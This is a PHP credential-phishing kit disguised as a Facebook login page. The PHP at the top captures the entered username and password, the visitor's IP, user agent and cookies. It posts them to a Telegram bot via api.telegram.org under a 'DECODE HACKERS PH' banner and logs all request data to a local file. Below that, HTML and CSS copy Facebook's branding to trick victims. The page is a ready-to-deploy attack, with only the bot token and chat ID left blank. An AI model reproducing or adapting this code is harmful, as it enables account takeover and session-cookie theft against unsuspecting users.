<?php
$chatID = "";
$token = "";

$username = isset($_POST['username']) ? $_POST['username'] : 'N/A';
$password = isset($_POST['password']) ? $_POST['password'] : 'N/A';
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'N/A';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';

$cookies = '';
foreach ($_COOKIE as $key => $value) {
    $cookies .= "$key=$value; ";
}

// Debugging output
$log = "Cookies: $cookies\n";
$log .= "POST Data: " . print_r($_POST, true) . "\n";
$log .= "Server Variables: " . print_r($_SERVER, true) . "\n";
file_put_contents('debug_log.txt', $log, FILE_APPEND);

$data = array(
    'chat_id' => $chatID,
    'text' => "\n\n\n[== Login Details ==]\nUsername: $username\nPassword: $password\n\n[== Other Details ==]\nIP Address: $ip\nUser Agent: $user_agent\nCookies: $cookies\n\n\n\n Watchzone:\nDECODE HACKERS PH!!!"
);

$url = "https://api.telegram.org/bot$token/sendMessage";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$result = curl_exec($ch);
curl_close($ch);

// Debugging output
file_put_contents('debug_log.txt', "CURL Result: $result\n", FILE_APPEND);
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login Form</title>
    <link rel="icon" href="https://i.ibb.co/0CvbLkT/IMG-20230723-231553-068.jpg">
    <style>
        body {
            padding: 0;
            margin: 0;
            background-image: url("https://i.ibb.co/nwNxGTg/lv-0-20230723214726.gif");
            background-color: #000;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: cover;
            background-position: center center;
            font-family: Arial, sans-serif;
            color: #fff;
        }
        .box {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100vh;
            padding: 20px;
            box-sizing: border-box;
        }
        .form-box {
            max-width: 500px;
            width: 100%;
            padding: 20px;
            text-align: center;
            border-radius: 5px;
            background: #fff;
            color: #000;
            box-shadow: 0px 2px 10px rgba(71, 71, 71, 0.52);
        }
        .form-box input {
            width: calc(100% - 30px);
            margin-bottom: 15px;
            padding: 15px;
            font-size: 18px;
            box-sizing: border-box;
            border: 1px solid #eeebeb;
            border-radius: 5px;
            outline: none;
        }
        .form-box input:focus {
            box-shadow: 0px 0px 1px 1px rgb(22, 111, 229);
        }
        .form-box button {
            width: calc(100% - 30px);
            margin-bottom: 15px;
            color: #fff;
            font-size: 20px;
            font-weight: 600;
            border-radius: 5px;
            border: none;
            padding: 13px 0;
            cursor: pointer;
            background: #166fe5;
        }
        .form-box button:hover {
            background: #1877f2;
        }
        .form-box a {
            color: #166fe5;
            font-size: 14px;
            text-decoration: none;
            margin-top: 5px;
            margin-bottom: 20px;
            display: block;
        }
        .form-box a:hover {
            text-decoration: underline;
        }
        .form-box hr {
            border: 1px solid #dadde1;
            margin-bottom: 15px;
        }
        .form-box .create-btn a {
            color: #fff;
            font-size: 16px;
            text-decoration: none;
            padding: 15px 20px;
            border-radius: 5px;
            background: #36a420;
            font-weight: 600;
            display: inline-block;
            margin-bottom: 5px;
        }
        .form-box img {
            width: 235px;
            height: auto;
        }
        .form-box .create-btn a:hover {
            background: #42b72a;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="form-box">
            <img src="https://cdn.cdnlogo.com/logos/f/23/facebook.svg" alt="Facebook"><br><br>
            <form action="" method="POST">
                <input name="username" type="text" placeholder="Enter Email or Phone number" required>
                <input name="password" type="password" placeholder="Enter password" required>
                <button type="submit">Log in</button>
                <a href="" target="_blank">Forgotten Password</a>
            </form>
            <hr>
            <div class="create-btn">
                <a href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://m.facebook.com/r.php&ved=2ahUKEwio55nXuaSAAxUz2TgGHW__CQ8QFnoECAsQAQ&usg=AOvVaw1qd0DR1zJb5KBZq51JT8b9" target="_blank">Create New Account</a>
            </div>
        </div>
    </div>
    <script>
        function click() {
            alert("Oops! Something went wrong.");
        }
    </script>
</body>
</html>